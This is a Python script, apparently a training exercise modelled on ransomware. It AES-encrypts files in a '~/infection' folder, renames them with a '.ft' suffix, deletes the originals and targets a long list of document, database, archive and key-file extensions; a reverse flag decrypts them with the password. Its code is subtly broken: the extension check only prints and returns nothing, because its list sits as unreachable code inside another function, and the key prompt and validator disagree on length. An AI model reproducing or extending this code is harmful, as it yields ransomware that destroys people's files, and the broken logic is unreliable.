#!/usr/bin/Python3.9.6
# encoding: utf-8
import os
import argparse
import getpass
import pyAesCrypt
import pprint

__version_info__ = ('1','0','0')

"""
TO DO:

  - You will include a file of no more than 50 lines called README.md with the instructions of use and, if required, to compile it.
  - Opción de desencriptar en un directorio diferente.

"""

# ENCRYPT files ----------------------------------------------------
def encryptAllFiles(silent):
  count = 0
  key = inputEncryptKey()
  for path, currentDirectory, files in os.walk(os.path.expanduser("~")+'/infection'):
    for file in files:
      if canEncrypt(file) == True:
        res = encryptFile(path, file, key, silent)
        if res == True:
          count  = count + 1
  if silent == False:
    print('%d ficheros encriptados' % (count))

def canEncrypt(file):
  ext = os.path.splitext(file)
  print(ext)
 
def encryptFile(path, file, key, silent):
  bufferSize = 256 * 1024
  pyAesCrypt.encryptFile(os.path.join(path, file), os.path.join(path, file+".ft"), key, bufferSize)
  os.remove(os.path.join(path, file))
  if silent == False:
    print("Encriptar:    ", os.path.join(path, file), " -> ",os.path.join(path, file+".ft"))
  return True


  exts = [".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2 ", ".docb", ".potx", ".sldx", ".jpeg",
    ".mp4", ".dch", ".frm", ".slk ", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif ", ".dot",
    ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc ", ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb",
    ".db", ".sxc ", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots ", ".xls", ".eml", ".vmx",
    ".raw", ".vob", ".ps1", ".accdb", ".ods ", ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb",
    ".max ", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds ", ".xlw", ".txt", ".PAQ",
    ".nef", ".swf", ".asm", ".asc", ".uot ", ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
    ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw ", ".xlc", ".123", ".bak", ".svg", ".sh",
    ".cpp", ".mml", ".ott ", ".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt ", ".xltm", ".wk1",
    ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem ", ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg",
    ".p12 ", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr ", ".pptm", ".onetoc2", ".rar",
    ".wma", ".asp", ".ldf", ".std", ".crt ", ".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key ",
    ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx ", ".ppsm", ".602", ".iso", ".mkv",
    ".brd", ".myi", ".odp", ".der ", ".ppsx", ".sxi"]
  if ext[1] in exts:
    return True
  return False


# DECRYPT files ----------------------------------------------------
def decryptAllFiles(silent, outputdir):
  if outputdir != None and os.path.isdir(outputdir) == False:
    try:
      if silent == False:
        print("Creamos el directorio ", outputdir)
      os.mkdir(outputdir)
    except:
      print("No hemos podido crear el directorio de salida")
      raise
  count = 0
  key = inputEncryptKey()
  for path, currentDirectory, files in os.walk(os.path.expanduser("~")+'/infection'):
    for file in files:
      if canDecrypt(file) == True:
        res = decryptFile(path, file, key, silent, outputdir)
        if res == True:
          count  = count + 1
        else:
          return False
  if silent == False:
    print('%d ficheros desencriptados' % (count))
  return True

def canDecrypt(file):
  ext = os.path.splitext(file)
  exts = [".ft"]
  if ext[1] in exts:
    return True
  return False

def decryptFile(path, file, key, silent, outputdir):
  if outputdir != None:
    path2 = outputdir
  else:
    path2 = path
  bufferSize = 256 * 1024
  try:
    pyAesCrypt.decryptFile(os.path.join(path, file), os.path.join(path2, file[:-3]), key, bufferSize)
  except:
    print("Clave de desencriptación erronea")
    return False
  os.remove(os.path.join(path, file))
  if silent == False:
    print("Desencriptar: ", os.path.join(path, file), " -> ", os.path.join(path2, file[:-3]))
  return True

# EncryptKey ----------------------------------------------------
def inputEncryptKey():
  while True:
    key = getpass.getpass("Clave de encriptación (16 caractares mínimo):")
    if validateEncryptKey(key) == True:
      return key

def validateEncryptKey(key):
  if len(key) >= 4:
    return True
  else:
    print ("Clave de encriptación demasiado corta")
    return False

# Main ----------------------------------------------------
parser = argparse.ArgumentParser(description='Script para encriptar y desencriptar ficheros dentro del directorio /infection/ del home del usuario')
parser.add_argument('-r', '--reverse', action='store_true', help='Desencripta los ficheros pidiendo una clave')
parser.add_argument('-s', '--silent', action='store_true', help='Desencripta los ficheros pidiendo una clave sin mostrar info')
parser.add_argument('-v', '--version', action='version', version="%(prog)s ("+'.'.join(__version_info__)+")", help='Muestra la versión del script')
parser.add_argument('-o', '--output', type=str, help='Directorio donde meter los ficheros desencriptadosS')

args = parser.parse_args()

if os.path.isdir(os.path.expanduser("~")+'/infection') == True:
  if args.reverse == True:
    while True:
      res = decryptAllFiles(args.silent, args.output)
      if res == True:
        break
  else:
    encryptAllFiles(args.silent)
else:
  print('No existe el directorio:', os.path.expanduser("~")+'/infection')
